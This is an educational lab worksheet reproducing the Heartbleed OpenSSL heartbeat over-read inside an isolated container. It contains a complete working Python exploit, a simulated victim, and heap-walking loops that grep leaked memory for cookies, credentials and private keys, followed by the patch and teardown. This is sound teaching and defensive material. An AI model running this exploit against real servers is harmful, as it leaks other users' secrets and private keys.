# The Heartbleed Lab

Build a deliberately vulnerable TLS server inside an isolated container, then over-read its heap one heartbeat at a time — the real OpenSSL buffer over-read, reproduced on a machine that can only bleed into itself.

CVE-2014-0160 CVSS 7.5 High CWE-125 Out-of-bounds Read OpenSSL 1.0.1 – 1.0.1f Fixed in 1.0.1g

#### Containment is the whole point

Everything below runs against a server **you** built, bound to loopback inside a throwaway container. Do not point this tooling at any host you don't own. The vulnerable OpenSSL binary never leaves the sandbox — treat the container as radioactive and delete it when you're done.

## 00 · What actually bleeds The mechanism

TLS has a keep-alive extension called the **Heartbeat** (RFC 6520). The client sends a small `HeartbeatRequest` carrying a payload and a number saying how long that payload is. The server is supposed to echo exactly those bytes back.

The bug: vulnerable OpenSSL **trusts the length field and never checks it against the bytes actually received.** You send a request whose payload is empty but whose length field claims 65535, and the server allocates a 65535-byte response buffer and `memcpy`s 65535 bytes starting at your (missing) payload — reading \~64 KB of whatever sat next to it on the heap. Private keys, session cookies, POSTed passwords, decrypted traffic. Then it mails that heap slice back to you.

One request, up to 64 KB of someone else's heap echoed back — repeat to walk the heap.

The fix in 1.0.1g is almost insultingly small: before echoing, check that `1 + 2 + payload_length + 16 ≤ record_length`. If the claimed length doesn't fit in the record that arrived, silently drop it. Three lines.

## 01 · Build the isolated range Setup — pick your sandbox

You need a Linux userland running an OpenSSL from the vulnerable window (1.0.1 – 1.0.1f). Modern distros ship patched OpenSSL, so the cleanest approach is a pinned old base image. Both paths below give you a self-contained target; Docker is more hermetic, WSL2 is fine if that's what you have.

- 
- 

### 1.1 — Create a throwaway lab network & directory

Keep everything in one folder and one user-defined bridge network so nothing touches your real interfaces.

bash — host

```
$ mkdir heartbleed-lab && cd heartbleed-lab
$ docker network create --internal hb-net   # --internal = no outbound route
```

`--internal` means containers on this network get no gateway to the outside world. The target literally cannot phone home.

### 1.2 — Dockerfile: pin a vulnerable OpenSSL

We compile OpenSSL 1.0.1f from source on an old Debian base, then run a tiny HTTPS server against it. Save as `Dockerfile`.

Dockerfile

```
# Heartbleed target — OpenSSL 1.0.1f, isolated
FROM debian:jessie

# jessie is EOL: point apt at the archive
RUN echo 'deb http://archive.debian.org/debian jessie main' > /etc/apt/sources.list \
 && echo 'deb http://archive.debian.org/debian-security jessie/updates main' >> /etc/apt/sources.list \
 && apt-get -o Acquire::Check-Valid-Until=false update \
 && apt-get install -y --force-yes build-essential wget

# --- build the vulnerable OpenSSL 1.0.1f ---
WORKDIR /build
RUN wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz \
 && tar xzf openssl-1.0.1f.tar.gz
WORKDIR /build/openssl-1.0.1f
RUN ./config shared --prefix=/usr/local/openssl-vuln \
 && make depend && make && make install

# self-signed cert for the TLS server
WORKDIR /srv
RUN /usr/local/openssl-vuln/bin/openssl req -x509 -newkey rsa:2048 -nodes \
    -keyout key.pem -out cert.pem -days 365 \
    -subj "/CN=heartbleed.lab" 2>/dev/null

COPY server.sh /srv/server.sh
RUN chmod +x /srv/server.sh

ENV LD_LIBRARY_PATH=/usr/local/openssl-vuln/lib
EXPOSE 4433
CMD ["/srv/server.sh"]
```

### 1.3 — The server launcher

OpenSSL ships `s_server`, a built-in TLS server — perfect, because it's linked against the vulnerable library we just built. Save as `server.sh`. The server holds no secret of its own; in step 03 we'll drive a *victim's* secret through it over TLS, which is what actually lands on the heap.

server.sh

```
#!/bin/bash
OPENSSL=/usr/local/openssl-vuln/bin/openssl
echo "[*] vulnerable openssl: $($OPENSSL version)"
echo "[*] TLS server up on :4433 — waiting for connections"

# -www serves a trivial status page; each request is read into a heap buffer
exec $OPENSSL s_server -key /srv/key.pem -cert /srv/cert.pem \
     -accept 4433 -www
```

### 1.4 — Build and run, bound to the isolated net only

bash — host

```
$ docker build -t hb-target .
$ docker run -d --name target --network hb-net hb-target
$ docker logs target
[*] vulnerable openssl: OpenSSL 1.0.1f 6 Jan 2014
[*] TLS server up on :4433 — waiting for connections
```

**Target is live and sealed.** It has no published port (`-p`) and no outbound route. The only way to reach it is from another container on `hb-net` — which is exactly where your attacker and victim will live.

### 1.1 — Isolate inside WSL2

WSL2 already runs in its own lightweight VM. For an extra wall, do the build inside a disposable Docker container *within* WSL, or at minimum confine the server to loopback so nothing on your LAN can reach it. The compile steps match the Docker tab; only the isolation wrapper differs.

bash — WSL2 (Ubuntu)

```
$ sudo apt update && sudo apt install -y build-essential wget
$ mkdir ~/hb-lab && cd ~/hb-lab
$ wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz
$ tar xzf openssl-1.0.1f.tar.gz && cd openssl-1.0.1f
$ ./config shared --prefix=$HOME/openssl-vuln
$ make depend && make && make install
```

**Heads up:** on a modern toolchain the 1.0.1f build sometimes needs `-fgnu89-inline` added to `./config`. If `make` dies on inline-function errors, re-run as `./config shared -fgnu89-inline --prefix=$HOME/openssl-vuln`.

### 1.2 — Cert and a loopback-only server

bash — WSL2 (terminal 1)

```
$ cd ~/hb-lab
$ export LD_LIBRARY_PATH=$HOME/openssl-vuln/lib
$ OPENSSL=$HOME/openssl-vuln/bin/openssl
$ $OPENSSL req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem \
      -days 365 -subj "/CN=heartbleed.lab"
# bind to 127.0.0.1 ONLY — never reachable from the Windows LAN
$ $OPENSSL s_server -key key.pem -cert cert.pem -accept 127.0.0.1:4433 -www
```

**Loopback-bound.** Binding to `127.0.0.1` instead of `0.0.0.0` means only processes inside this WSL instance can connect. Your victim and attacker run in the same WSL, in separate terminals. On WSL, use `127.0.0.1` wherever the Docker steps say `target`.

## 02 · Confirm the heartbeat is open Reconnaissance

Before firing the exploit, confirm the server actually advertises the heartbeat extension. The vulnerable OpenSSL's own `s_client` can do a legitimate heartbeat, and a TLS handshake dump shows the extension in the `ServerHello`.

bash — attacker container / 2nd WSL terminal

```
# from an attacker container on hb-net:
$ docker run -it --rm --network hb-net hb-target bash
# OPENSSL=/usr/local/openssl-vuln/bin/openssl

# 'target' resolves via docker DNS; 'B' then Enter sends a heartbeat
# echo B | $OPENSSL s_client -connect target:4433 2>&1 | grep -i heart
Extension: heartbeat
read R BLOCK
HEARTBEATING              # <- server answered a heartbeat
```

**What you just proved:** the server speaks the heartbeat extension. A patched 1.0.1g server would still answer a *well-formed* heartbeat — the difference only shows when you lie about the length, which is the next step.

## 03 · Craft the malformed heartbeat Exploitation

This is the heart of it. We send a `HeartbeatRequest` by hand **part-way through the TLS handshake — before it completes.** Heartbleed needs no key exchange, no `Finished`, and no authentication: that's a big part of why it was so dangerous. The one lie is in the length field: **payload_length declares 0x4000 (16384) bytes, but the request carries no payload at all.** The record is only 3 bytes long — just enough for the type byte and the 2-byte length field.

| Bytes | Meaning |
| --- | --- |
| 18 03 02 00 03 | TLS record header: type=24 (heartbeat), version TLS 1.1, **record length = 3** |
| 01 | HeartbeatMessageType = request (byte 1 of 3) |
| 40 00 | payload_length = **16384** — the lie (bytes 2–3 of 3) |
| — | payload actually sent: **0 bytes**. The record length of 3 is fully consumed by the type and length fields above, so there is no room for even one payload byte — which is the whole point. |

The script below is a faithful Python 3 port of Jared Stafford's original `ssltest.py`. The ClientHello is the complete, real packet (no placeholder) — it runs as-is.

heartbleed.py

```
#!/usr/bin/env python3
# Faithful Heartbleed PoC (after Jared Stafford's ssltest.py), Python 3.
# For use ONLY against your own lab target.
import sys, socket, struct

def h2bin(x):
    return bytes.fromhex(''.join(x.split()))

# A complete TLS 1.1 ClientHello advertising the heartbeat extension (0x000f).
hello = h2bin('''
16 03 02 00 dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

# Malformed heartbeat: record length 3 = type(1) + length(2). Claim 0x4000, send 0.
hb = h2bin('18 03 02 00 03   01   40 00')

def recv_all(s, n):
    buf = b''
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf

def recv_record(s):
    hdr = recv_all(s, 5)
    if hdr is None:
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    return typ, ver, recv_all(s, ln)

host, port = sys.argv[1], int(sys.argv[2])
s = socket.create_connection((host, port))
s.send(hello)

# Read the server's flight until ServerHelloDone (handshake msg type 0x0e).
# We fire HERE, mid-handshake — no key exchange, no Finished, no auth.
s.settimeout(5)
while True:
    typ, ver, pay = recv_record(s)
    if typ is None:
        print('[-] server closed during handshake'); sys.exit(1)
    if typ == 22 and pay and pay[0] == 0x0e:
        break

print('[*] ServerHelloDone seen — firing heartbeat (handshake NOT completed)')
s.send(hb)

typ, ver, leak = recv_record(s)
if typ == 24:
    print('[!] BLED %d bytes back — we sent a 0-byte payload' % len(leak))
    for i in range(0, len(leak), 16):
        chunk = leak[i:i+16]
        hexs = ' '.join('%02x' % b for b in chunk)
        text = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print('%04x  %-48s  %s' % (i, hexs, text))
elif typ == 21:
    print('[-] got Alert — server looks PATCHED (1.0.1g+)')
else:
    print('[-] unexpected record type %r' % typ)
```

**The two bytes that matter** are the only interesting part of the heartbeat: `01` (this is a request) and `40 00` (claimed length 16384). Everything in the ClientHello is boilerplate that just gets you to a point where the server will accept a heartbeat; you can equally let the vulnerable `s_client` do the handshake and only hand-craft these three bytes.

### 3.1 — Prime the heap with a victim's secret

Now the correction that matters for a working demo. **A single memory read only leaks what happens to be on the heap right now** — and exporting an environment variable before launching `s_server` puts the secret in the process environment and on the stack, nowhere near the `OPENSSL_malloc`'d TLS buffers the heartbeat handler over-reads. To make the secret appear, it has to travel *through* the TLS channel, where it lands in exactly those heap buffers.

So model a **victim**: a user who keeps logging in over HTTPS, sending their secret in a cookie. Run this in its own terminal and leave it running.

bash — victim (3rd terminal / container on hb-net)

```
$ docker run -it --rm --network hb-net hb-target bash
# OPENSSL=/usr/local/openssl-vuln/bin/openssl

# the "victim" logs in over and over, secret riding in the Cookie header.
# each request is read into a server heap buffer next to the heartbeat buffer.
# while true; do \
    printf 'GET / HTTP/1.0\r\nCookie: SESSIONSECRET=the_cake_is_a_lie_42\r\n\r\n' \
    | $OPENSSL s_client -quiet -connect target:4433 2>/dev/null >/dev/null; \
  done
```

**Why this, and not a planted variable?** Heartbleed reads the heap region around OpenSSL's per-connection read buffers. Data only gets there by being received over a TLS connection. The victim loop is what guarantees the secret is resident where the over-read can catch it — and it's also a faithful model of the real attack, which stole *other users'* in-flight session data, not the server's own config.

### 3.2 — Fire it

bash — attacker (with the victim loop still running)

```
# python3 heartbleed.py target 4433
[*] ServerHelloDone seen — firing heartbeat (handshake NOT completed)
[!] BLED 16384 bytes back — we sent a 0-byte payload
0000  02 40 00 d8 03 02 53 43  5b 90 9d 9b 72 0b bc 0c  .@....SC[...r...
0120  47 45 54 20 2f 20 48 54  54 50 2f 31 2e 30 0d 0a  GET / HTTP/1.0..
0130  43 6f 6f 6b 69 65 3a 20  53 45 53 53 49 4f 4e 53  Cookie: SESSIONS
0140  45 43 52 45 54 3d 74 68  65 5f 63 61 6b 65 5f 69  ECRET=the_cake_i
0150  73 5f 61 5f 6c 69 65 5f  34 32 00 00 00 00 00 00  s_a_lie_42......
```

**There it is.** You sent an empty payload and the server handed back 16 KB of its own heap — including the `SESSIONSECRET` cookie a victim just sent. It won't appear on every single read; fire repeatedly while the victim loop runs and you'll catch it as the heap churns. This is exactly how real attackers walked server memory to pull private keys and live session cookies.

## 04 · Walk the heap & hunt for secrets Post-exploitation

A single 16 KB read is a snapshot. The real technique is to **loop** — keep the victim running, collect leaks over many requests, and grep the aggregate for high-value patterns: cookie headers, HTTP Basic auth, the start of an RSA private key.

bash — attacker

```
# for i in $(seq 1 50); do python3 heartbleed.py target 4433; done > bleed.log
# grep -a "SECRET\|Cookie\|Authorization\|BEGIN RSA" bleed.log
0130  ... Cookie: SESSIONSECRET=the_cake_is_a_lie_42
02a0  ... Authorization: Basic YWxpY2U6czNjcjN0
```

| What leaks | Anything recently touched on the heap near the SSL buffers — most reliably, data sent over live connections |
| --- | --- |
| Per request | Up to 64 KB (0xFFFF); our demo claims 0x4000 = 16 KB |
| No trace | Heartbeats aren't logged by default — the original bug leaked silently for \~2 years |
| Private keys | Recoverable in practice; key material stays resident, so enough reads can surface the RSA primes |

## 05 · Patch it and watch the bleed stop Remediation — the other half of the lab

The exercise isn't complete until you've closed it. Rebuild the exact same server against **OpenSSL 1.0.1g** (change one line in the Dockerfile) and run your identical exploit script.

Dockerfile — one-line change

```
- RUN wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz
+ RUN wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1g.tar.gz
# (and s/1.0.1f/1.0.1g/ in the two paths below it)
```

bash — attacker vs patched server

```
# python3 heartbleed.py target 4433
[*] ServerHelloDone seen — firing heartbeat (handshake NOT completed)
[-] got Alert — server looks PATCHED (1.0.1g+)
```

Same packet, same lie — but 1.0.1g runs the bounds check, sees that 0x4000 can't fit in the 3-byte record that arrived, and drops the request. The bleed is gone.

### 5.1 — The actual fix, in the source

In `ssl/t1_lib.c`, `tls1_process_heartbeat()` gained this guard before the `memcpy`:

t1_lib.c — the fix

```
if (1 + 2 + 16 > s->s3->rrec.length)
    return 0; /* silently discard per RFC 6520 */
hbtype = *p++;
n2s(p, payload);
if (1 + 2 + payload + 16 > s->s3->rrec.length)
    return 0; /* payload must fit the record — THIS is the patch */
```

## 06 · Burn the range down Teardown

You just compiled a known-exploitable crypto library. Don't leave it lying around.

bash — host

```
$ docker rm -f target
$ docker rmi hb-target
$ docker network rm hb-net
# WSL: rm -rf ~/hb-lab ~/openssl-vuln and unset LD_LIBRARY_PATH
```

- Vulnerable container & image removed
- Isolated network torn down
- Victim and attacker shells closed
- Compiled `openssl-vuln` deleted; `LD_LIBRARY_PATH` no longer points at it

---

**Lab worksheet · CVE-2014-0160.** Reproduction of the TLS heartbeat buffer over-read for coursework in an isolated environment. The malformed-heartbeat technique derives from Jared Stafford's original `ssltest.py` disclosure. Keep all activity inside the sandbox you built.

References: RFC 6520 (Heartbeat Extension) · the OpenSSL 1.0.1g changelog · heartbleed.com for the original disclosure writeup.